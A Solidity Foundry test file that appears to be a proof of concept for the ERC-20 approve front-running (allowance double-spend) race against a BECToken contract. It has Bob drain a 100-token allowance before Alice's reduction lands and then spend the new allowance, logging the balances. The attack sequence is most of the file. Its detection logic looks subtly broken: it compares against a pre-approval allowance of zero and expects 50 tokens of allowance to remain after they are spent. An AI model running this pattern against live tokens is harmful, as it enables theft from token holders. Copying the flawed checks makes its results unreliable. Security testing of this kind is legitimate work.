// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BECToken.sol";

contract BecTokenFrontRunTest is Test {
    BecToken token;
    address owner = address(0x1);
    address alice = address(0x2);
    address bob = address(0x3);
    address eve = address(0x4);

    function setUp() public {
        vm.prank(owner);
        token = new BecToken();
        
        vm.prank(owner);
        token.transfer(alice, 1000 ether);
    }

    function testMinersCanDoubleSpendAllowance() public {
        // Pre-attack state capture
        console.log("--- BEFORE-Trigger State ---");
        uint aliceBalancePre = token.balanceOf(alice);
        uint bobBalancePre = token.balanceOf(bob);
        uint eveBalancePre = token.balanceOf(eve);
        uint allowancePre = token.allowance(alice, bob);
        
        console.log("Alice balance (pre):", aliceBalancePre);
        console.log("Bob balance (pre):", bobBalancePre);
        console.log("Eve balance (pre):", eveBalancePre);
        console.log("Allowance (Alice->Bob) (pre):", allowancePre);

        // Setup allowance
        vm.prank(alice);
        token.approve(bob, 100 ether);

        // Prepare allowance reduction call
        bytes memory approvalCall = abi.encodeWithSelector(
            token.approve.selector,
            bob,
            50 ether
        );

        console.log("--- Trigger Front-run Attack ---");
        // Miner front-runs allowance reduction
        vm.prank(bob);
        token.transferFrom(alice, eve, 100 ether);

        // Execute allowance reduction
        vm.prank(alice);
        (bool success,) = address(token).call(approvalCall);
        require(success, "Approval call failed");

        // Bob spends reduced allowance
        vm.prank(bob);
        token.transferFrom(alice, bob, 50 ether);

        // Post-attack state capture
        console.log("--- AFTER-Trigger State ---");
        uint aliceBalancePost = token.balanceOf(alice);
        uint bobBalancePost = token.balanceOf(bob);
        uint eveBalancePost = token.balanceOf(eve);
        uint allowancePost = token.allowance(alice, bob);
        
        console.log("Alice balance (post):", aliceBalancePost);
        console.log("Bob balance (post):", bobBalancePost);
        console.log("Eve balance (post):", eveBalancePost);
        console.log("Allowance (Alice->Bob) (post):", allowancePost);

        // Calculate state changes
        uint aliceLoss = aliceBalancePre - aliceBalancePost;
        uint bobGain = bobBalancePost - bobBalancePre;
        uint eveGain = eveBalancePost - eveBalancePre;
        bool allowancedReduced = allowancePost < allowancePre;

        console.log("--- Differential Analysis ---");
        console.log("Alice tokens lost:", aliceLoss);
        console.log("Bob tokens gained:", bobGain);
        console.log("Eve tokens gained:", eveGain);
        console.log("Allowance reduced?:", allowancedReduced ? "YES" : "NO");

        // Final Vulnerability Detection
        if(aliceLoss == 150 ether && 
           bobGain == 50 ether && 
           eveGain == 100 ether && 
           allowancePost == 50 ether) {
            console.log("Vulnerability Exists: Transaction ordering exploited for double spending");
        } else {
            console.log("Vulnerability not Exist: Incorrect state change pattern detected");
        }
    }
}